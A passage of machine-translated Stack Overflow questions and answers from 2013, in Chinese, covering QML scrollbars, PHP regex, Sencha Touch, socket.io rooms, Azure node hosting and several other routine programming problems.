    contentHeight: bobol.height
    Row {
        id : bobol
        Rectangle {
            width: 100
            height: 400
            color: 'red'
            MouseArea {
                id: sideButtonMouseArea
                anchors.fill: parent
                hoverEnabled: true
                onClicked: {
                    parent.color = '#4872E8'
                }}}
        Rectangle {
            width: 1000
            height: 200
        }
    }
    states: State {
        name: "ShowBars"
        when: view.movingHorizontally
        PropertyChanges { target: verticalScrollBar; opacity: 1 }
    }
    transitions: Transition {
        NumberAnimation { properties: "opacity"; duration: 400 }
    }
}
ScrollBar {
    id: verticalScrollBar
    width: view.width-12; height: 12
    anchors.bottom: view.bottom
    opacity: 10
    orientation: Qt.Horizontal
    position: view.visibleArea.xPosition
    pageSize: view.visibleArea.widthRatio
}
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-21T22:03:28.313

从此代码中使用，我改进了您的代码：

```
import QtQuick 1.0
Item{
    Flickable {
    id: view
    anchors.fill: parent
    contentWidth: bobol.width
    contentHeight: bobol.height
    Row {
        id : bobol
        Rectangle {
            width: 100
            height: 400
            color: 'red'
            MouseArea {
                id: sideButtonMouseArea
                anchors.fill: parent
                hoverEnabled: true
                onClicked: {
                    parent.color = '#4872E8'
                }}}
        Rectangle {
            width: 1000
            height: 200
        }
    }
    states: State {
        name: "ShowBars"
        when: view.movingHorizontally
        PropertyChanges { target: verticalScrollBar; opacity: 1 }
    }
    transitions: Transition {
        NumberAnimation { properties: "opacity"; duration: 400 }
    }
}
ScrollBar {
    id: verticalScrollBar
    width: view.width-12; height: 12
    anchors.bottom: view.bottom
    opacity: 10
    orientation: Qt.Horizontal
    position: view.visibleArea.xPosition
    pageSize: view.visibleArea.widthRatio
} 
```

}

# iphone - 使用语音控制在 iPhone 中启动应用程序

> ID：15244530
> 
> 赞同：1
> 
> 时间：2013-03-06T10:16:47.340
> 
> 标签：iphone, voice, openears

我从要使用语音控制启动应用程序的 iPhone 应用程序开始。当我们在 iPhone 上说话时，应用程序应该会启动。我正在使用 OpenEars 框架。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:22:41.090

不，这在 iPhone 中是不可能的。Siri 可能内置了一些功能，但 Apple 迄今尚未向应用程序开发人员公开任何此类 API。OpenEars Framework 可能会理解用户在说什么，但无法基于此打开应用程序。

对于越狱的 iPhone，有可能做到这一点。[iOS 的 VoiceActivator 允许语音控制命令](http://gizmodo.com/5751436/take-over-voice-control-on-ios-with-voiceactivator)。但它不会在普通 iPhone 上运行。

希望这可以帮助...

# php - 以特定字符串开头并忽略包含特定字符串的正则表达式

> ID：15244531
> 
> 赞同：3
> 
> 时间：2013-03-06T10:16:49.983
> 
> 标签：php, regex, preg-match

我正在尝试在 PHP 中编写一个正则表达式，它将匹配任何包含“搜索/站点/*”的字符串，但前提是它不包含字符串“ss_language”

这是我到目前为止所拥有的：[http](http://regexr.com?3416i) : //regexr.com?3416i 这成功匹配任何“搜索/站点/*”，包括“搜索/站点”，所以现在我需要排除任何包含“ss_language”的字符串的位

考虑到这一点，似乎我可以嵌套另一个 preg_match 来查找 ss_language，但与单个正则表达式相比，这是最好的方法吗？这甚至可以用一个正则表达式来实现吗？以下是一些示例以及它们应返回的内容：

*   通过 - 搜索/站点
*   通过 - 搜索/站点/猫
*   通过 - search/site/dog?f[0]=im_field_technology%3A20858
*   通过 - search/site/cat%20dog?f[0]=im_field_technology%3A20858
*   失败 - 搜索/站点/cat%20dog?f[0]=ss_language%3Aen
*   失败 - 搜索/站点/?f[0]=im_field_technology%3A20858&f[1]=ss_language%3Aen
*   失败 - 搜索/站点/?f[1]=ss_language%3Aen&f[0]=im_field_technology%3A20858
*   通过 - 搜索/站点/?f[0]=im_field_technology%3A20858&f[1]=im_field_technology%3A20875o
*   失败 - 节点/23/编辑

提前感谢您的帮助。我对这些很陌生。这是一次失败的尝试：[http ://regexr.com?3416f](http://regexr.com?3416f)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:26:43.320

您可以使用否定前瞻来断言字符串不包含`ss_language`

```
^search/site/?(?!.*ss_language.*).*$ 
```

如果您只是想要一个关于它是否匹配的真/假答案，那么您实际上并不需要`.*$`（它只会`search/site`与可选的匹配，因为字符串`/`中没有`ss_language`任何地方（短版本）：

```
^search/site/?(?!.*ss_language) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:32:52.657

您可以查看[http://regexr.com?3417a](http://regexr.com?3417a)以获取以下正则表达式：

`^search/site/?(?:(?!ss_language).)*$`

它确实使用了负前瞻。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T11:03:18.257

您不需要使用速度较慢的正则表达式。使用[strpos()](http://us3.php.net/manual/en/function.strpos.php)：

```
$status = (0 === strpos($url, 'search/site') && FALSE === strpos($url, 'ss_language'))
    ? 'PASS'
    : 'FAIL'; 
```

查看：**[演示](http://viper-7.com/GbVQFC)**

基本上，它的作用是检查 URL 是否以开头，`search/site`如果是，则检查它是否不包含`ss_language`并将返回`TRUE`或`FALSE`或在此示例中通过/失败。根本不需要正则表达式，因为您只是在寻找子字符串。

# extjs4 - Sencha Touch：尝试将列表添加到面板

> ID：15244533
> 
> 赞同：0
> 
> 时间：2013-03-06T10:17:05.590
> 
> 标签：extjs4, sencha-touch, sencha-touch-2

我有一个由文本框、按钮和 ListView 组成的面板。我相信我已经正确设置了这个列表，但列表除外。Listview 不显示来自商店的数据。请帮助我尝试添加如下：

```
Ext.define('Abc.view.Trains', {
extend: 'Ext.Panel',
xtype:'searchtrains',
requires: [ 'Ext.dataview.List','Ext.Label','Ext.form.FieldSet'
'Abc.view.SearchTrainResults','Abc.view.SampleList'],
config: {
    title: 'Train Enquiry',
    items: [

        {
            xtype: 'fieldset',
            style:'width:74%;  float:left',
            margin:'10px',
            items: 
                {
                    xtype: 'textfield',
                    placeHolder: 'Username',
                    itemId: 'trainNoTextField',
                    name: 'trainNoTextField',
                    required: true
            }

        },
        {
            xtype: 'button',
            itemId: 'trainSearchButton',
            ui: 'action',
            padding: '10px',
            text: 'Go',
            style:'width:20%; margin-top:10px; float:right'
        },
        {
            xtype: 'sampList',
        }
     ]
    ]}; 
```

**Abc/view/SampleList**

```
 Ext.define('Abc.view.SampleList', {
extend: 'Ext.List',
xtype: 'sampList',
requires: ['TrainEnquiry.store.SampleList'],

config: {
    title: 'Train Enquiry',
        itemTpl: '<div class="myContent">'+ 
                '<div><b>{status}</b> </div>' +
                '</div>',
        store: 'SampleList',
},
}); 
```

**Abc/商店/SampleList**

```
 Ext.define('Abc.store.SampleList', {
extend: 'Ext.data.Store',

config: {
    fields: ['status'],
    data: [
        { status: "Live! Train Statusjhgkbvdsbvfbnsdfvsdgfjasdgjhagsdhjasgdahjsgdjhasdbahjsgdsajhdgahjsgdashdgajhsdgajhsdvahjsdg" },
        { status: "Live! Station Statustusjhgkbvdsbvfbnsdfvsdgfjasdgjhagsdhjasgdahjsgdjhasdbahjsgdsajhdgahjsgdashdgajhsdgajhsdvahjsdg" },
        { status: "Train Time Tabletusjhgkbvdsbvfbnsdfvsdgfjasdgjhagsdhjasgdahjsgdjhasdbahjsgdsajhdgahjsgdashdgajhsdgajhsdvahjsdg"}
    ]
}
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T11:43:06.937

如果您刚刚复制了代码，那么可能是因为您忘记在“Ext.form.FieldSet”之后添加一个昏迷

```
requires: [ 'Ext.dataview.List','Ext.Label','Ext.form.FieldSet'
'Abc.view.SearchTrainResults','Abc.view.SampleList'], 
```

我厌倦了以下内容，它对我有用：

查看\Trains.js

```
Ext.define('Abc.view.Trains', {
extend: 'Ext.Panel',
xtype:'searchtrains',
requires: ['Ext.dataview.List','Ext.Label','Ext.form.FieldSet','Abc.view.SampleList'],
config: {
title: 'Train Enquiry',
layout:'vbox',
items: [
{
    flex:1,
        xtype: 'fieldset',
        style:'width:74%;  float:left',
        margin:'10px',
        items: 
            {
                xtype: 'textfield',
                placeHolder: 'Username',
                itemId: 'trainNoTextField',
                name: 'trainNoTextField',
                required: true
        }

    },
    {
    flex:1,
        xtype: 'button',
        itemId: 'trainSearchButton',
        ui: 'action',
        padding: '10px',
        text: 'Go',
        style:'width:20%; margin-top:10px; float:right'
    },
    {
    flex:1,
        xtype: 'sampList',
    }
]}
}); 
```

查看\SampleList.js

```
Ext.define('Abc.view.SampleList', {
extend: 'Ext.List',
xtype: 'sampList',
requires: ['Abc.store.SampleList'],

config: {
    title: 'Train Enquiry',
    itemTpl: '<div class="myContent">'+ 
            '<div><b>{status}</b> </div>' +
            '</div>',
    store: 'SampleList',
},
}); 
```

商店\SampleList.js

```
Ext.define('Abc.store.SampleList', {
extend: 'Ext.data.Store',

config: {
fields: ['status'],
data: [
    { status: "Live! Train Statusjhgkbvdsbvfbnsdfvsdgfjasdgjhagsdhjasgdahjsgdjhasdbahjsgdsajhdgahjsgdashdgajhsdgajhsdvahjsdg" },
    { status: "Live! Station Statustusjhgkbvdsbvfbnsdfvsdgfjasdgjhagsdhjasgdahjsgdjhasdbahjsgdsajhdgahjsgdashdgajhsdgajhsdvahjsdg" },
    { status: "Train Time Tabletusjhgkbvdsbvfbnsdfvsdgfjasdgjhagsdhjasgdahjsgdjhasdbahjsgdsajhdgahjsgdashdgajhsdgajhsdvahjsdg"}
]}
}); 
```

索引.html

```
<html>
<head>
    <link href="sencha-touch.css" rel="stylesheet" type="text/css">
    <script type="text/javascript"  src="sencha-touch-all-debug.js"></script>
    <link rel="stylesheet" href="resources/css/app.css" type="text/css">
</head>

<body>
    <script type="text/javascript">

Ext.application(
{
    name: 'Abc',
    views: ['Trains','SampleList'],
    stores:['SampleList'],

    launch: function() 
    {
        Ext.Viewport.add(Ext.create('Abc.view.Trains'));    
    }
});

    </script>
</body>
</html> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T12:31:07.983

像这样的东西？

```
Ext.define('Abc.view.Trains', {
extend: 'Ext.Panel',
xtype:'searchtrains',
requires: ['Ext.dataview.List','Ext.Label','Ext.form.FieldSet','Abc.view.SampleList'],
config: {
title: 'Train Enquiry',
layout:'vbox',
items: [
{
    flex:1,
    xtype:'panel',
    layout:'hbox',
    items:[{
        flex:2,
        xtype: 'fieldset',
        style:'width:74%;  float:left',
        margin:'10px',
        items: 
        {
            xtype: 'textfield',
            placeHolder: 'Username',
            itemId: 'trainNoTextField',
            name: 'trainNoTextField',
            required: true
        }
    },{
        flex:1,
        xtype: 'button',
        itemId: 'trainSearchButton',
        ui: 'action',
        padding: '10px',
        text: 'Go',
        style:'width:20%; margin-top:10px; float:right'
    }]
},{
    flex:10,
    xtype: 'sampList',
}]
}
}); 
```

# c++ - 将击键发送到未聚焦的显示器

> ID：15244539
> 
> 赞同：0
> 
> 时间：2013-03-06T10:17:18.387
> 
> 标签：c++, linux, qt, x11, keyevent

如果它不在前台，我正在尝试将关键事件发送到显示事件。

目前我正在做以下事情：

```
Display *d_;
d_ = XOpenDisplay(NULL);
system(QString("xdotool key Shift+F8").toStdString().c_str());
XFlush(d_);
XCloseDisplay(d_); 
```

虽然当显示器没有聚焦时这不起作用。

所以我的问题是：

1.  当没有聚焦时，如何将关键事件发送到显示器。
2.  有没有比通过 shell 启动工具更好的方法来发送击键？
3.  为什么我必须在使用 shell 命令之前打开一个新的显示器？

我正在使用 Qt，代码应该在 Linux 上运行。

# java - 如何以编程方式控制不同进程中的 Java Swing 应用程序？

> ID：15244540
> 
> 赞同：1
> 
> 时间：2013-03-06T10:17:20.067
> 
> 标签：java, swing, user-interface

我需要编写一个程序来通过它是 GUI 以编程方式控制 Java Swing 应用程序。

该程序需要能够将值放在应用程序的文本字段中，然后单击“确定”按钮，就像人类可以使用此应用程序一样。

我不熟悉 Swing，所以我不知道从哪里开始。我查看了一些 Java Swing GUI 测试工具，但它们似乎都需要启动 Swing 应用程序作为工具的一部分，而在我的用例中，它必须能够在不同的进程中控制已经运行的 Swing 应用程序。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-06T10:21:53.230

java [awt 机器人](http://docs.oracle.com/javase/6/docs/api/java/awt/Robot.html)类正是用于自动化 gui 交互。[在这里](http://www.javalobby.org/java/forums/t19836.html)看到一篇不错的介绍文章。

使用机器人类，您可以通过名称/id/position/whatever 来定位各种 gui 元素，并以与用户生成的事件相同的方式与它们交互。

[关于将 ui 作为工具的一部分运行 - 当然这是最简单的解决方案，但您也可以使用附加 API](http://docs.oracle.com/javase/6/docs/technotes/guides/attach/)将代码注入到已经运行的 JVM 中。您可以编写一个 java 代理并将其从另一个 java 进程（您的自动化工具）附加到正在运行的 UI 应用程序中。这与调试器和分析器使用的机制相同。[javadocs](http://docs.oracle.com/javase/6/docs/jdk/api/attach/spec/com/sun/tools/attach/VirtualMachine.html)中有一些示例代码

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-06T10:22:04.633

您可能想看看“机器人”类和相关技术：

*   [http://docs.oracle.com/javase/7/docs/api/java/awt/Robot.html](http://docs.oracle.com/javase/7/docs/api/java/awt/Robot.html)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-06T10:22:57.957

如果您只想从第二个“调试测试”应用程序生成/发送关键命令，您可以使用 Java 类[Robot](http://docs.oracle.com/javase/1.4.2/docs/api/java/awt/Robot.html)

如果您想进行更多更改，您可以为 Booth Java 应用程序创建一个[RMI 连接](http://www.eg.bucknell.edu/~cs379/DistributedSystems/rmi_tut.html)，并从一个到另一个进行通信。原始应用程序是服务器，您的调试应用程序是客户端。

因此，您可以注册客户端并向服务器发送命令。客户端可以使用服务器的 java 类。课程通过 RMI 提交。所以客户端可以直接控制服务器的框架。

**编辑：**

您也可以使用[Mouse-Click Recorder](http://www.jitbit.com/macro-recorder/)。您可以启动您的摇摆应用程序，启动记录器并单击/键入您想要的任何内容到您的摇摆应用程序中。

每一次点击都会被存储。下次在同一屏幕位置启动摇摆应用程序时，您可以启动录制的鼠标事件，您的光标/键盘将神奇地用于填充您的摇摆应用程序。

# php - 在 AS3 中打印数据库查询结果

> ID：15244541
> 
> 赞同：0
> 
> 时间：2013-03-06T10:17:21.380
> 
> 标签：php, mysql, actionscript-3, flash

PHP 的新手。尝试在 Flash 中创建一个高分表，我已将我的游戏链接到数据库，并且可以毫无问题地将分数发送给它。我也可以检索它们，但问题在于输出。

我的用于检索数据并输出的 PHP 代码：

```
<?php
include_once("connect.php");
if ($_POST['systemCall'] == "getScores"){
    $sql = "SELECT * FROM highscores ORDER BY score DESC LIMIT 0,5";
    $query = mysql_query($sql);
    $counter = mysql_num_rows($query);
    if ($counter > 0){
        while ($data = mysql_fetch_array($query)){
            $name = $data["name"];
            $correct = $data["correct"];
            $time = $data["time"];
            $score = $data["score"];
            print "systemResult=$name\t\t\t$correct\t\t$time\t\t$score\n\n\n";
        }
    } else {
        print "systemResult=Error.";
    }
}
?> 
```

Flash 和 AS3 正在接收输出，我已经将它显示在我想要的游戏中，问题是“systemResult=”出现在所有输出的开头，但第一个输出除外。所以高分表是这样的：

```
name                  correct    time    score
alice                 19/20      38s     2182
systemResult=bob      17/20      68s     1827
systemResult=charlie  15/20      55s     1722 
```

我知道我可能可以通过字符串操作来删除它，但我想正确地做到这一点 - 我是否以正确的方式输出数据，如果没有，正确的方式是什么？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:22:03.773

我假设您正在检索数据并使用该`systemResult`项目。如果是这样，将代码更改为以下内容应该可以解决问题。

```
if ($counter > 0){
    print "systemResult=";
    while ($data = mysql_fetch_array($query)){
        $name = $data["name"];
        $correct = $data["correct"];
        $time = $data["time"];
        $score = $data["score"];
        print "$name\t\t\t$correct\t\t$time\t\t$score\n\n\n";
    }
} else {
    print "systemResult=Error.";
} 
```

# php - jQuery克隆行 - 在特定字段中插入值

> ID：15244543
> 
> 赞同：2
> 
> 时间：2013-03-06T10:17:33.087
> 
> 标签：php, jquery

这里需要一些帮助。

所以基本上我有一个包含以下字段的表格。单击“添加更多产品”按钮后，它会克隆产品、库存和数量字段并创建一个新行。Product 字段是产品的下拉列表（从 mysql 查询）

我需要帮助的是，如果有人选择了一种产品，我需要它来查询数据库并显示所选产品的库存水平。我已经让它与一行一起工作，但不能让它在克隆的元素上工作（分别）。代码如下。非常感谢一些帮助。

```
<select name="product[]" id="product">
    <option value="product 1"> Product 1</option>
    <option value="product 2"> Product 2</option>
    <option value="product 3"> Product 3</option>
    <option value="product 4"> Product 4</option>
</select>
<input type="text" id="stockclass="inputfield" name="stock" size="8" />

$('#product').on("change", function() {
    var val = $(this).val();
    $("#stock").val(val2);                        
});

$("#add").on("click", function() {
    var row = $('#item tbody > tr:last').clone(true);            
    row.insertAfter('#itemsTable tbody > tr:last');
   return false;            
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:19:59.577

使用`.on()`因为`.live()`从现在开始贬值。

```
$(document).on('click','SELECTOR',function(){ /*...*/ }); 
```

您正在克隆完全错误`DOMs`的相同内容。`ID`使用`Class`.

**例子**

```
<select name="product[]" class="product">
    <option value="product 1"> Product 1</option>
    <option value="product 2"> Product 2</option>
    <option value="product 3"> Product 3</option>
    <option value="product 4"> Product 4</option>
</select>
<input type="text" class="quantity inputfield" name="quantity[]" size="8" value="" />
<input type="text" class="target_price inputfield" name="target_price[]" size="8" value="" />
<input type="text" class="stock_availability inputfield" name="stock_availability[]" size="8" value="" readonly="readonly" /> 
```

现在另一个是你有选择框的点击事件是错误的，它应该是改变事件。

**作为**

```
$('.product').on('change',function()
{

    $.ajax(
    {
        //ajax params and options and in success set value
    });

}); 
```

# android - 从 ParseObject 获取单个数组值

> ID：15244545
> 
> 赞同：2
> 
> 时间：2013-03-06T10:17:33.120
> 
> 标签：android, arrays, parsing, parse-platform

一个简单的问题，我有一个 ParseObject，它是从 Parse.com 检索的，其中有一列包含一个具有整数值的数组。

如何从 Android 中的该数组中获取单个值。

我没有找到任何东西，也没有在文档中找到任何东西，也没有在 web.xml 中找到任何东西。

如果有人可以提供帮助，我将不胜感激:)

![这是对象](../Images/957d0a38131992b176e24fdea14dd33d.png) ![我的解析数据库](../Images/a6e4bb1d86e2df10f7aa24d717622611.png)

# android - 在多个类和片段中使用 facebook 登录凭据

> ID：15244550
> 
> 赞同：0
> 
> 时间：2013-03-06T10:17:55.193
> 
> 标签：android, facebook, login, facebook-android-sdk

我正在创建一个需要用户通过 Facebook 登录的应用程序。我可以通过使用会话和打开图在该活动中检索他们的登录详细信息（用户 ID、用户名）。

但是我想在应用程序的其他活动和片段中使用它。例如显示特定于登录用户的选项。

然而问题是我不能使用意图来传递用户的详细信息，因为这些活动不是相互调用的。

我尝试过使用公共变量，但这不起作用。

有谁知道如何在应用程序中轻松检索 Facebook 登录凭据？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:23:49.203

您可以使用静态变量并以这种方式访问​​类之间的凭据。

```
public static class FacebookCredentials
{
  private static String credentials;

  public static String getCredentials()
  {
    return credentials;
  }

  public static void setCredentials(String credentials)
  {
    FacebookCredentials.credentials = credentials;
  }

 } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T18:22:33.387

您是否使用适用于 Android 3.0 的 Facebook SDK？

如果是这样，您应该使用“活动会话”机制（Session.setActiveSession()、Session.openActiveSession()、Session.getActiveSession() 等）。您应该能够从任何活动/片段中调用 Session.getActiveSession，因为它是 Session 类中的静态变量。

# ios - iOS 通用应用程序 - 自定义 UITableViewCell

> ID：15244551
> 
> 赞同：0
> 
> 时间：2013-03-06T10:17:55.337
> 
> 标签：ios, ipad, uitableview, ios-universal-app

我正在创建一个通用的 iPhone/iPad 应用程序，我想在主视图上有自定义单元格。它适用于 iPhone，但在 iPad 上 dequeueReusableCellWithIdentifier: 返回 nil 而不是单元格。这是我的一些代码（我用普通的 UITableViewCell 替换了我的自定义单元格，因为它无论如何都不起作用）：

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier;

    if ([[UIDevice currentDevice] userInterfaceIdiom] == UIUserInterfaceIdiomPad) {
        CellIdentifier = @"MainPadCell"; //works fine when replaced with MainPhoneCell
        __weak UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier]; //returns nil

        [cell.textLabel setText:@"Test"];

        return cell; //crash
    }else{
        CellIdentifier = @"MainPhoneCell";
        __weak UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

        [cell.textLabel setText:[NSString stringWithFormat:@"Cell %i", indexPath.row]];

        return cell;
    }
} 
```

奇怪的是，当我用 MainPhoneCell 替换 MainPadCell 单元时，它会显示电话单元（虽然我的 iPad 故事板中没有任何 MainPhoneCell 重用标识符，但我在 iPad 故事板中有 MainPadCell 并且找不到它）。
感谢您的任何建议！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:49:56.023

如果您为两者使用相同的控制器，则重用标识符需要相同。您可以选择在 iPad TableViewCell 中拥有更多对象（标签等），并且可以在 iPad 单元格中以不同方式布局，但子类化 TableViewCell（如果您将其子类化）和重用标识符对于 iPhone 和平板电脑。

确保还将单元格、单元格对象（同样，如果您正在子类化）以及 TableView 委托和数据源出口连接到您已子类化的 VC。

链接到示例项目，展示如何使用相同的 sublcas 和重用 id： [https ://dl.dropbox.com/u/3660978/UniversalTableView.zip](https://dl.dropbox.com/u/3660978/UniversalTableView.zip)

# node.js - Socket.io 加入房间注册房间但只加入一个空字符串房间

> ID：15244553
> 
> 赞同：3
> 
> 时间：2013-03-06T10:17:57.587
> 
> 标签：node.js, socket.io

我正在使用 socket.io/node.js/express。当我使用 socket.join('room') 加入 socket.io 房间时，它会注册房间，但用户只加入“房间”。

此命令显示所有房间，它返回“房间”和“”，即使我从未创建过“房间”：

```
console.log(io.sockets.manager.rooms); // ['room', ''] 
```

此命令显示客户端已加入的所有房间，并返回一个空字符串 ''：

```
console.log(io.sockets.manager.roomClients[socket.id]); // [''] 
```

此命令应向房间中的每个客户端广播一条消息。使用实际房间（data.chatroom）时失败。**但是当你用null**或 ''替换 data.chatroom 时，它会将消息广播到空字符串房间：

```
io.sockets.in(data.chatroom).emit('broadcast_message',  {message: data.message, handle: data.handle}); 
```

任何帮助将不胜感激，这是非常奇怪的行为:(

编辑：这是相关的服务器代码

```
var express = require('express'), 
app = express(),
http = require('http'),
server = http.createServer(app),
io = require('socket.io').listen(server),
routes = require('./routes'), 
chatroom = require('./routes/chatroom'),
path = require('path');

io.configure(function () {
    io.set("transports", ["xhr-polling"]);
    io.set("polling duration", 10);
});

io.sockets.on('connection', function (socket) {
    socket.on('join_room', function(data) {
        socket.join(data.chatroom);
        socket.emit('joined_room', data.chatroom);
    });

    socket.on('send_message', function (data) {
        io.sockets.in(data.chatroom).emit('broadcast_message',  {message: data.message, handle: data.handle});
    });
});

app.configure(function(){
    app.set('port', process.env.PORT || 3000);
    app.set('views', __dirname + '/views');
    app.set('view engine', 'jade');
    app.use(express.favicon());
    app.use(express.logger('dev'));
    app.use(express.bodyParser());
    app.use(express.cookieParser());
    app.use(express.methodOverride());
    app.use(app.router);
    app.use(express.static(path.join(__dirname, 'public')));
});

app.get('/', routes.index);
app.get('/room/:chatroom', chatroom.create_room);

server.listen(app.get('port'), function(){
    console.log("Express server listening on port " + app.get('port'));
}); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-07-25T10:25:37.553

默认情况下，每个连接到套接字（socket.io 服务器）的客户端都被分配到一个由空对象或数组表示的空房间，我现在不记得了。

这是我用于将客户加入房间的代码：

```
socket.room = "room1";
socket.join(socket.room); 
```

这就是您发送消息的方式：`socket.sockets.in(client.room).emit("update", "A person has connected to " + room.name + " room.");`

我认为你错过了`socket.room`一点。看看这个存储库：[https ://github.com/tamaspiros/advanced-chat](https://github.com/tamaspiros/advanced-chat)

和相应的文章：

[http://tamaspiros.co.uk/2013/07/15/advanced-chat-using-node-js-and-socket-io-episode-1/](http://tamaspiros.co.uk/2013/07/15/advanced-chat-using-node-js-and-socket-io-episode-1/)

# node.js - 如何在 Windows azure 云项目中启动节点 js 脚本？

> ID：15244558
> 
> 赞同：0
> 
> 时间：2013-03-06T10:18:03.863
> 
> 标签：node.js, azure, socket.io, iisnode

我对 node js 和 socket.io 非常陌生。我正在将 socket.io 用于 Windows azure 项目。我创建了一个启动 socket.io 服务器的 App.js，但我不知道如何以编程方式运行该脚本。我能够从命令提示符（如“node app.js”）运行该脚本，并且 socket.io 服务器启动并且客户端应用程序能够与 socket.io 服务器很好地交互。

我也可以去 127.0.0.1/App.js 和 socket.io 服务器启动。

但是我希望脚本在我在 VS 中启动项目后立即自动运行。关于我该怎么做的任何想法？

编辑：

原来iisnode可以处理所有事情，我只需要在web.config中放置一个重写代码。从这里[http://www.windowsazure.com/en-us/develop/nodejs/tutorials/getting-started/](http://www.windowsazure.com/en-us/develop/nodejs/tutorials/getting-started/)的示例 azure node js 应用程序我得到了这个重写代码

```
<rewrite>
  <rules>
    <clear />
    <rule name="app" enabled="true" patternSyntax="ECMAScript" stopProcessing="true">
      <match url="iisnode.+" negate="true" />
      <conditions logicalGrouping="MatchAll" trackAllCaptures="false" />
      <action type="Rewrite" url="App.js" />
    </rule>
  </rules>
</rewrite> 
```

它会自动启动 App.js，但会将我的所有视图重新定向到 App.js 脚本。我想这与我上面写的重写代码有关。我应该进行哪些更改才能让 App.js 在启动时运行并且仍然能够访问我的其他 html 视图？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-14T03:38:23.640

好吧，根据您使用 socket.io 的原因，工作者角色可能更适合。WebRole 目前不支持 WebSockets，因此如果您使用 Web 角色，则需要将传输设置为仅 xhr-polling。

如果您只是对 Web 角色感兴趣，还可以考虑使用 azure 网站来托管您的应用程序。您可以查看我的示例存储库，其中包含一个可以直接部署到 azure 网站的 socket.io 聊天应用程序：

[http://github.com/markcowl/WebChatDefault-1](http://github.com/markcowl/WebChatDefault-1)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T16:23:01.417

本教程是在 Azure 上构建和部署 nodeJS 应用程序的分步指南[http://www.windowsazure.com/en-us/develop/nodejs/tutorials/getting-started/](http://www.windowsazure.com/en-us/develop/nodejs/tutorials/getting-started/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T15:08:12.547

你有没有改变你的处理程序“iisnode”？

```
<!-- indicates that the server.js file is a node.js application 
to be handled by the iisnode module -->
<handlers>
  <add name="iisnode" path="App.js" verb="*" modules="iisnode" />
</handlers>
<rewrite>
  <rules>
    <clear />
    <rule name="app" enabled="true" patternSyntax="ECMAScript" stopProcessing="true">
        <match url="iisnode.+" negate="true" />
        <conditions logicalGrouping="MatchAll" trackAllCaptures="false" />
        <action type="Rewrite" url="App.js" />
    </rule>
  </rules>
</rewrite> 
```

并在 .csdef 中编辑 WebRole 的任务：

```
<Task commandLine="node.cmd ..\App.js" executionContext="elevated" /> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-13T00:01:11.713

您需要在运行 node.js 的服务定义中设置一个入口点，然后当您在模拟器中运行项目时，它会自动启动，例如：

请注意，您不必*对*节点应用程序使用 vs，您可以使用 Windows Azure PowerShell 设置节点辅助角色来托管您的应用程序，请参阅：

[http://www.windowsazure.com/en-us/develop/nodejs/tutorials/app-using-socketio/](http://www.windowsazure.com/en-us/develop/nodejs/tutorials/app-using-socketio/)

有关使用 PowerShell 设置 socket.io 应用程序的教程

# iphone - iOS + Titanium 中的本地通知

> ID：15244561
> 
> 赞同：1
> 
> 时间：2013-03-06T10:18:07.607
> 
> 标签：iphone, notifications, titanium

我正在使用 Titanium 来设置本地通知。我得到的一切都很好。我正在为未来 10 天设置 10 个通知，静态时间为上午 11 点。我没有使用重复功能，因为整天，消息会有所不同。问题是，我只收到 5 个通知。剩下的5个没有被解雇。我在同一天做这个。现在，当我每天更改它时，例如今天上午 11 点，明天上午 11 点，......在设备上安装了应用程序。将设备日期更改为明天，时间更改为上午 10:55。但 5 分钟后，我没有收到任何通知。

谁能帮我？

# linux - 为什么 Apache Cordova 不支持 Linux 桌面？

> ID：15244568
> 
> 赞同：2
> 
> 时间：2013-03-06T10:18:25.670
> 
> 标签：linux, cordova

我最近看到这个项目开发多平台应用程序，我看到所有主要的移动平台，以及 MAC OS X 和 Windows 桌面，但是，为什么没有 Linux 桌面支持？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T10:21:52.620

那是因为你在 linux 上可能有不同的 GUI 平台。Linux 并不总是带有窗口系统。

如果您想使用 Cordova 为 linux 构建桌面应用程序，那么您可能需要[Cordova for QT](https://github.com/apache/incubator-cordova-qt)。

*免责声明：我从未为 QT 尝试过 Cordova，我不知道它的成熟度。*

# struts2 - struts2-jquery 网格视图中的操作错误

> ID：15244571
> 
> 赞同：4
> 
> 时间：2013-03-06T10:18:29.157
> 
> 标签：struts2, struts2-jquery, struts2-json-plugin, struts2-jquery-grid

在对 struts 2 jQuery 网格的值进行一些服务器端验证后，我想在网格顶部显示操作错误。任何帮助，将不胜感激。

这是我的操作错误。

```
addActionError("You can not delete this  data"); 
```

但不幸的是，我无法在我的 jsp 页面中显示错误。请分享您对这个问题的了解。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T11:41:12.413

试试这个

基本概念：你必须做一个jsp。

说 error.jsp 并在错误返回时，只需加载 error.jsp。

在 error.jsp 中写入 `addActionError("You can not delete this data");`.

并将此 error.jsp 包含到您希望显示错误消息的主网格页面中

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T10:02:56.587

